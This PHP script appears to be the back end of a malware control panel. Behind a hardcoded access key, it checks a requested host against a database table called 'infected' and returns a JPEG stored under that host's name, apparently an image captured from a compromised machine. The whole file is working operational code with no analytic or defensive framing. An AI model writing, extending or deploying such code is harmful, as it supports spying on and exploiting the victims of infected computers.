<?php
	include_once "db/Info.php";

	if (!isset($_GET["host"]) or !isset($_GET["key"]) or $_GET["key"] != "5F4p42L6Qwu8LFjAm9dqiXnWUWAhs5mtg24pHnR3tEj6PimrrpXCrUAAzf4cmX9B") {
		http_response_code(400);
		exit("Invalid or missing parameters");
	}

	$host = filter_input(INPUT_GET, "host", FILTER_SANITIZE_STRING);
	$result = $bdd->query("SELECT * FROM infected WHERE host = ?", $host);

	if ($result->numRows() == 0) {
		http_response_code(400);
		exit("Unknown host");
	}

	$image_folder = "/home/images/";
	$images = glob($image_folder . '*.jpeg');

	foreach ($images as $image) {
		if (strpos($image, $host) !== false) {
			$data = @file_get_contents($image);
			
			if ($data === false) {
				http_response_code(500);
				exit("Could not read image file");
			}
			
			header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
			header("Cache-Control: post-check=0, pre-check=0", false);
			header("Pragma: no-cache");
			header("Content-Type: image/jpeg");
			echo $data;

			break;
		}
	}

	// Reached only if no image is echo'd

	http_response_code(400);
	exit("No image found for host " . $host);

?>